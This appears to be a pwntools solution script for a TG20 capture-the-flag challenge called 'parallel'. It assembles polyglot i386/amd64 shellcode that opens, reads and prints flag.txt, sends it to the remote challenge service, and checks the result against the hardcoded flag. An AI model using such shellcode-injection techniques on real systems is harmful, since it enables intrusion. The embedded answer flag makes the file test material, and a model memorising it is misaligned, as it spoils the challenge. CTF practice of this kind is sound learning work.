#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './pwnme32'
#context.update(arch='amd64')
#exe = './pwnme64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
#host = args.HOST or 'parallel.tghack.no'
if args.REGION:
    host = args.REGION + ".parallel.tghack.no"
else:
    host = "parallel.tghack.no"
port = int(args.PORT or 6005)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#b *0x000000000040020d
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x080481ee
break main
continue
'''.format(**locals())

# inspired by this writeup:
# https://tcode2k16.github.io/blog/posts/2019-04-08-midnightsunctf-polyshell-writeup/
def get_i386():
    context.arch="i386"
    payload = asm("""
    jmp there
here:
    pop ebx /* filename */
    mov ecx, {open_flags}
    mov eax, {sys_open}
    int 0x80

    /* read flag */
    call lol
lol:
    pop esi
    add esi, 0x200
    mov ebx, 0
    mov ecx, esi
    mov edx, 0x40
    mov ebx, eax /* fd from open() */
    mov eax, {sys_read}
    int 0x80

    /* write flag to stdout */
    mov edx, eax
    mov ecx, esi
    mov ebx, 1
    mov eax, {sys_write}
    int 0x80

    xor ebx, ebx
    mov eax, {sys_exit}
    int 0x80
there:
    call here
""".format(sys_open=int(constants.SYS_open),
           sys_exit=int(constants.SYS_exit),
           open_flags=int(constants.O_RDONLY),
           sys_read=int(constants.SYS_read),
           sys_write=int(constants.SYS_write)), arch="i386", os="linux", bits=32) + "flag.txt\x00"

    return payload

def get_amd64():
    context.arch="amd64"
    payload = asm("""
    lea rdi, [rip + flag]
    mov r8, rdi
    mov rsi, {open_flags}
    mov rax, {sys_open}
    syscall

    mov rdi, rax
    add r8, 0x100
    mov rsi, r8
    mov rdx, 0x40
    mov rax, {sys_read}
    syscall

    mov rsi, r8
    mov rdi, 0x1
    mov rdx, rax
    mov rax, {sys_write}
    syscall

    xor rdi, rdi
    mov rax, {sys_exit}
    syscall
flag:
""".format(open_flags=int(constants.O_RDONLY),
            sys_open=int(constants.SYS_open),
            sys_exit=int(constants.SYS_exit),
            sys_read=int(constants.SYS_read),
            sys_write=int(constants.SYS_write)), arch="amd64", os="linux", bits=64) + "flag.txt\x00"
    return payload

sc_32 = get_i386()
sc_64 = get_amd64()
payload = unhex('31c941e2{:x}'.format(len(sc_32)))
payload += sc_32
payload += sc_64

io = start()

io.recvline()
io.sendline(payload)

flag = io.recvline()[:-1]
io.close()
log.info("flag: {}".format(flag))
if flag == "TG20{parallel_universes_ftw_}":
    log.success("yay!")
    sys.exit(101)
else:
    sys.exit(102)